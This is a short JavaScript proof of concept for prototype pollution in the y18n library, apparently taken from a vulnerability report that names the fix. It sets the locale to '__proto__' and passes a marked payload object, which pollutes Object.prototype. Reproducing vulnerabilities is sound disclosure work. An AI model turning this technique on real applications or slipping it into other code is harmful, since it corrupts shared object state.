// fixed by `this.cache = Object.create(null)`

const y18n = require("y18n")();

y18n.setLocale("__proto__");
y18n.updateLocale({ polluted: "yes" }); //payload
